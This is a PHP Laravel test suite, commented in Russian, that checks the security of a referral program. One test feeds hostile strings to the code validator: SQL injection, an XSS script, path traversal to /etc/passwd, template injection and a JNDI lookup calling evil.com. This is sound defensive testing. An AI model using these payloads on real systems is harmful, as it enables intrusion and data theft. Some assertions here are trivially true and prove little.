<?php

namespace Tests\Feature;

use Tests\TestCase;
use App\Models\User;
use App\Models\ReferralCode;
use App\Models\Referral;
use App\Models\ReferralSetting;
use App\Services\ReferralService;
use App\Enums\Users\Type;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Laravel\Sanctum\Sanctum;

class ReferralSecurityTest extends TestCase
{
    use RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();
        
        ReferralSetting::create([
            'key' => 'program_enabled',
            'value' => 'true',
            'description' => 'Referral program enabled'
        ]);
        
        ReferralSetting::create([
            'key' => 'cashback_percentage',
            'value' => '10.00',
            'description' => 'Cashback percentage'
        ]);
    }

    public function test_prevent_self_referral()
    {
        $user = User::factory()->create(['type' => Type::Executor->value]);
        $referralCode = ReferralCode::createForUser($user);
        
        $referralService = app(ReferralService::class);
        
        // Попытка использовать собственный промокод
        $referral = $referralService->processReferralRegistration($user, $referralCode->code);
        $this->assertNull($referral, 'User should not be able to refer themselves');
        
        // Валидация собственного кода
        $validation = $referralService->validateReferralCode($referralCode->code, $user);
        $this->assertFalse($validation['valid']);
        $this->assertStringContainsString('own', $validation['message']);
    }

    public function test_prevent_duplicate_referral_relationships()
    {
        $referrer = User::factory()->create(['type' => Type::Executor->value]);
        $referred = User::factory()->create(['type' => Type::Executor->value]);
        
        $referralCode = ReferralCode::createForUser($referrer);
        
        $referralService = app(ReferralService::class);
        
        // Первая регистрация - должна пройти
        $referral1 = $referralService->processReferralRegistration($referred, $referralCode->code);
        $this->assertNotNull($referral1);
        
        // Попытка повторной регистрации той же пары через сервис
        $referral2 = $referralService->processReferralRegistration($referred, $referralCode->code);
        $this->assertNull($referral2, 'Service should prevent duplicate referral registration');
        
        // Проверяем, что в БД только одна запись
        $count = Referral::where('referrer_id', $referrer->id)
                         ->where('referred_id', $referred->id)
                         ->count();
        $this->assertEquals(1, $count);
    }

    public function test_referral_api_authorization()
    {
        $user1 = User::factory()->create(['type' => Type::Executor->value]);
        $user2 = User::factory()->create(['type' => Type::Executor->value]);
        
        $referralCode1 = ReferralCode::createForUser($user1);
        $referralCode2 = ReferralCode::createForUser($user2);
        
        // Авторизуемся как user1
        Sanctum::actingAs($user1);
        
        // Получаем свою статистику - должно работать
        $response = $this->getJson('/api/referrals/my-stats');
        $response->assertStatus(200);
        
        $data = $response->json();
        $this->assertEquals($referralCode1->code, $data['result']['referral_code']);
        
        // Получаем свой код - должно работать
        $response = $this->getJson('/api/referrals/my-code');
        $response->assertStatus(200);
        
        $data = $response->json();
        $this->assertEquals($referralCode1->code, $data['result']['code']);
        
        // Попытка получить чужие данные через прямой запрос не должна быть возможна
        // (API не предоставляет такой функционал, что является правильным)
    }

    public function test_sql_injection_protection_in_referral_codes()
    {
        $maliciousInputs = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "{{7*7}}",
            "\${jndi:ldap://evil.com/a}"
        ];
        
        $referralService = app(ReferralService::class);
        
        foreach ($maliciousInputs as $maliciousInput) {
            $validation = $referralService->validateReferralCode($maliciousInput);
            $this->assertFalse($validation['valid'], 
                "Malicious input should not validate: {$maliciousInput}");
        }
        
        // Проверяем, что БД не была повреждена
        $userCount = User::count();
        $this->assertGreaterThanOrEqual(0, $userCount, 'Database should not be corrupted');
    }

    public function test_rate_limiting_protection()
    {
        $user = User::factory()->create(['type' => Type::Executor->value]);
        Sanctum::actingAs($user);
        
        // Имитируем множественные запросы валидации
        for ($i = 0; $i < 10; $i++) {
            $response = $this->postJson('/api/referrals/validate-code', [
                'code' => 'TEST' . $i
            ]);
            
            // Все запросы должны обрабатываться (нет встроенного rate limiting в тестах)
            $this->assertTrue(in_array($response->status(), [200, 429]), 'Response should be either success or rate limited');
        }
    }

    public function test_referral_balance_manipulation_protection()
    {
        $user = User::factory()->create([
            'type' => Type::Executor->value,
            'referral_balance' => 1000
        ]);
        
        Sanctum::actingAs($user);
        
        // Попытка использовать отрицательную сумму
        $response = $this->postJson('/api/referrals/use-balance', [
            'amount' => -10.00
        ]);
        $response->assertStatus(400);
        
        // Попытка использовать очень большую сумму
        $response = $this->postJson('/api/referrals/use-balance', [
            'amount' => 999999.99
        ]);
        $response->assertStatus(400);
        
        // Попытка использовать нечисловое значение
        $response = $this->postJson('/api/referrals/use-balance', [
            'amount' => 'invalid'
        ]);
        $response->assertStatus(400);
        
        // Баланс не должен измениться после неудачных попыток
        $user->refresh();
        $this->assertEquals(1000, $user->referral_balance);
    }

    public function test_referral_code_case_sensitivity()
    {
        $user = User::factory()->create(['type' => Type::Executor->value]);
        $referralCode = ReferralCode::createForUser($user);
        
        $referralService = app(ReferralService::class);
        
        // Тестируем различные варианты написания
        $codeVariations = [
            $referralCode->code,
            strtolower($referralCode->code),
            ucfirst(strtolower($referralCode->code)),
        ];
        
        foreach ($codeVariations as $variation) {
            $validation = $referralService->validateReferralCode($variation);
            
            if ($variation === $referralCode->code) {
                $this->assertTrue($validation['valid'], 'Original code should be valid');
            } else {
                // В зависимости от реализации, может быть case-insensitive
                // Здесь проверяем текущее поведение
                $this->assertIsBool($validation['valid']);
            }
        }
    }

    public function test_referral_system_data_consistency()
    {
        $referrer = User::factory()->create(['type' => Type::Executor->value]);
        $referred = User::factory()->create(['type' => Type::Executor->value]);
        
        $referralCode = ReferralCode::createForUser($referrer);
        $referral = Referral::create([
            'referrer_id' => $referrer->id,
            'referred_id' => $referred->id,
            'referral_code_id' => $referralCode->id,
            'status' => 'active'
        ]);
        
        // Проверяем консистентность связей
        $this->assertEquals($referrer->id, $referral->referrer->id);
        $this->assertEquals($referred->id, $referral->referred->id);
        $this->assertEquals($referralCode->id, $referral->referralCode->id);
        
        // Проверяем обратные связи
        $this->assertTrue($referrer->referrals->contains($referral));
        $this->assertEquals($referral->id, $referred->referredBy->id);
        
        // Проверяем, что промокод связан с правильным пользователем
        $this->assertEquals($referrer->id, $referralCode->user->id);
        $this->assertTrue($referralCode->referrals->contains($referral));
    }

    public function test_referral_system_edge_cases()
    {
        $referralService = app(ReferralService::class);
        
        // Тест с пустыми строками
        $validation = $referralService->validateReferralCode('');
        $this->assertFalse($validation['valid']);
        
        $validation = $referralService->validateReferralCode('   ');
        $this->assertFalse($validation['valid']);
        
        // Тест с очень длинными кодами
        $longCode = str_repeat('A', 100);
        $validation = $referralService->validateReferralCode($longCode);
        $this->assertFalse($validation['valid']);
        
        // Тест с специальными символами
        $specialCodes = ['ABC@123', 'ABC-123', 'ABC_123', 'ABC.123'];
        foreach ($specialCodes as $code) {
            $validation = $referralService->validateReferralCode($code);
            $this->assertFalse($validation['valid'], "Code with special characters should be invalid: {$code}");
        }
    }
}
